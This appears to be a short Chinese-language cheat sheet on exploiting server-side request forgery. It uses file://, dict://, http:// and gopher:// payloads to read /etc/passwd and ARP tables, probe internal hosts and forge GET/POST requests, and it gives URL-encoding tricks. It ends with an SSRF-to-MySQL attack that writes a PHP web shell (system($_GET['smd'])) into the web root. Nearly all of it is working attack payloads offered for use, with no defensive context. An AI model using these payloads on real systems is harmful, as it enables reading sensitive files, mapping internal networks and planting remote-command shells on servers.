
---

file://  协议

```
可以通过
file:///etc/passwd 
检查是否存在file://

通过
file:///etc/hosts
查看存活主机，并了解网段信息

file:///proc/net/arp
查看本机arp记录

```

dict://

```
dict://ip:port/info

查看扫描id
```

http://

```
http://
扫描网段主机，扫描主机文件

```

gopher://

```
该伪协议默认端口为70
传输数据时，会将第一个字符吃掉
gopher://ip:port/_XXX

```
GET传输
```

payload：
GET /name.php?name=666 HTTP/1.1
Host: 172.250.250.4

注意！！最后需要加上换行符
（1）
xxx的数据需要url编码, ?对应%3f，换行对应%0d%0a，空格对应%20
或
在数据框中一次url全编码

（2）
burpsuit 数据包修改，进行两次url全编码即可

```
POST传输
```
pyload:

POST /name.php HTTP/1.1
Host: 172.250.250.4
Content-Type: application/x-www-form-urlencoded
Content-Length: 8

name=hzh
注意
Content-Length长度为post数据总长度
（1）
在数据框中一次url全编码
（2）
在数据包中两次url全编码

```


gopher协议对sql注入时，注意不能有空格，加号之类的，需要进行url编码

ssrf对mysql进行未授权查询
```
手工
使用tcpdump抓取握手包，用wirshark进行分析，截取发出的指令原数据
使用脚本生成gopher-原理每两个前加一个%

工具 gopherus直接生成

```
ssrf对mysql进行未授权文件写入
```
sql指令
show variables like %secure%';
secure_file_priv没有值，说明mysql可以自行设置文件存储路径
select '<?php system($_GET['smd']);?>' into outfile '/var/www/html/cmd.php';

```